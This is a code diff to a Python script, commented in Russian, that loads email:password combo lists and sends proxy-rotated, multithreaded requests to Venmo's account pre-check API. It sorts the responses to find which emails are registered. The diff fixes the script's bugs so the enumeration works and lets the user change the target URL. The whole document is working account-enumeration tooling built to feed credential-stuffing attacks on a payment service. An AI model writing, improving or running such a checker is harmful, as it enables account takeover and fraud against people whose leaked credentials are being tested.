@@ -4,20 +4,22 @@ import threading
 import queue
 import signal
 import sys
+import os
 from typing import Optional, Dict, List
 
 # Конфигурация
-INPUT_FILE = "emails.txt"  # Файл с email:pass
-PROXY_FILE = "proxy.txt"  # Файл с прокси (опционально)
-OUTPUT_FILE_1 = "1.txt"  # Успешные ответы
-OUTPUT_FILE_2 = "2.txt"  # Ответы с ошибкой 422
-RETRY_FILE = "retry.txt"  # Запросы для повторной проверки
-REMAINS_FILE = "remains.txt"  # Остаток данных при остановке
+INPUT_FILE = "data/emails.txt"  # Файл с email:pass
+PROXY_FILE = "data/proxy.txt"  # Файл с прокси (опционально)
+OUTPUT_FILE_1 = "data/1.txt"  # Успешные ответы
+OUTPUT_FILE_2 = "data/2.txt"  # Ответы с ошибкой 422
+RETRY_FILE = "data/retry.txt"  # Запросы для повторной проверки
+REMAINS_FILE = "data/remains.txt"  # Остаток данных при остановке
 THREADS = 1 # Количество потоков
+REQ_URL = "https://api.venmo.com/v1/account/pre-check"  # URL для проверки
 
 # Отношение респонсов к файлам
-RESPONSES_FOR_FILE_1 = (200, 201, 202, 203)
-RESPONSES_FOR_FILE_2 = (400, 401, 402, 403, 404)
+RESPONSES_FOR_FILE_1 = (200,)
+RESPONSES_FOR_FILE_2 = (422,)
 
 # Очередь для email:pass
 email_queue = queue.Queue()
@@ -52,6 +54,7 @@ def load_proxies():
                 print("Прокси не найдены. Работа без прокси")
             else:
                 print(f"Прокси найдены. Работа с прокси")
+            proxies.append(None)
     except FileNotFoundError:
         print("Файл с прокси не найден. Работа без прокси.")
 
@@ -78,14 +81,17 @@ def save_result(email: str, password: str, response: requests.Response):
             f.write(get_response_string(response, f"{email}:{password}"))
     else:
         with open(RETRY_FILE, "a") as f:
-            f.write(f"{email}:{password}\n")
+            f.write(get_response_string(response, f"{email}:{password}"))
 
 def get_response_string(response: requests.Response, *data):
     """Возвращает строковое представление ответа."""
     response_string = f"HTTP {response.status_code} {response.reason}\n"
     for header, value in response.headers.items():
         response_string += f"{header}: {value}\n"
-    response_string += f"{response.json()}\n"
+    try:
+        response_string += f"{response.json()}\n"
+    except:
+        response_string += "Не удалось получить данные\n"
     for el in data:
         response_string += f"{el}\n"
     return response_string + "\n"
@@ -98,20 +104,20 @@ def worker():
             email, password = email_queue.get()
             proxy = proxies.pop(0) if proxies else None
             proxies.append(proxy) if proxy else None
-            print(f"Запуск через прокси: {proxy}")
+            print(f"Запуск через прокси: {proxy} email: {email}")
 
-            data = {"data": {"email": password}}
+            data = {"data": {"email": email}}
             try:
                 response = requests.post(
-                    "https://api.venmo.com/v1/account/pre-check",
+                    REQ_URL,
                     headers=HEADERS,
-                    json=json.dumps(data),
+                    json=data,
                     proxies={"http": proxy, "https": proxy} if proxy else None,
                     timeout=10,
                 )
                 save_result(email, password, response)
             except requests.RequestException as e:
-                print(f"Ошибка запроса для {password}: {e}")
+                print(f"Ошибка запроса для {email}: {e}")
                 email_queue.put((email, password))  # Повторная попытка
         except Exception as e:
             print(f"Ошибка в потоке: {e}")
@@ -137,15 +143,20 @@ def save_remains():
 
 def main():
     global THREADS
+    global REQ_URL
     # Загрузка данных
+    print(os.getcwd())
     load_proxies()
     load_emails()
+
 
     threads = input("Напишите количество потоков: ").strip()
     if not threads.isdigit() or int(threads) <= 0:
         print("Некорректное число потоков. Запуск в одном потоке")
     else:
         THREADS = int(threads)
+    
+    REQ_URL = input("Напишите URL для запроса: ").strip()
 
     # Обработка сигнала для остановки
     signal.signal(signal.SIGINT, signal_handler)
